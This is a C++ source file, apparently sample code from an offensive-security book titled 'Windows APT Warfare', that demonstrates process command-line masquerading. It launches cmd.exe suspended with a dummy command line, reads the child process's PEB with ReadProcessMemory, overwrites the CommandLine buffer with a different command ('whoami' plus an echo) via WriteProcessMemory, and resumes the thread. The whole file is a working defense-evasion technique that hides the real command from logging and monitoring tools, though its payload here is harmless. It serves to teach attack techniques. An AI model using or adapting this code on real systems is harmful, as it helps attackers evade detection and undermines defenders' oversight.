/**
 * masqueradeCmdline.cpp
 *
 * basic idea from:
 * www.ired.team/offensive-security/defense-evasion/masquerading-processes-in-userland-through-_peb
 *
 * Windows APT Warfare
 * by aaaddress1@chroot.org
 */
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#pragma warning (disable : 4996)

int main(void) {
	PROCESS_INFORMATION PI = {}; STARTUPINFOA SI = {}; CONTEXT CTX = { CONTEXT_FULL };
	RTL_USER_PROCESS_PARAMETERS parentParamIn;
	PEB remotePeb;

	char dummyCmdline[MAX_PATH]; /* AAA... 260 bytes */
	memset(dummyCmdline, 'A', sizeof(dummyCmdline));

	wchar_t new_szCmdline[] = L"/c whoami & echo P1ay Win32 L!k3 a K!ng. & sleep 100";
	CreateProcessA("C:/Windows/SysWOW64/cmd.exe", dummyCmdline, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &SI, &PI);
	GetThreadContext(PI.hThread, &CTX);

	// fetch current PEB struct of the child process.
	ReadProcessMemory(PI.hProcess, LPVOID(CTX.Ebx), &remotePeb, sizeof(remotePeb), 0);

	// read RTL_USER_PROCESS_PARAMETERS struct data.
	auto paramStructAt = LPVOID(remotePeb.ProcessParameters);
	ReadProcessMemory(PI.hProcess, paramStructAt, &parentParamIn, sizeof(parentParamIn), 0);

	// change current cmdline of the child process.
	WriteProcessMemory(PI.hProcess, parentParamIn.CommandLine.Buffer, new_szCmdline, sizeof(new_szCmdline), 0);

	// resume main thread of the child process.
	ResumeThread(PI.hThread);
	return 0;
}


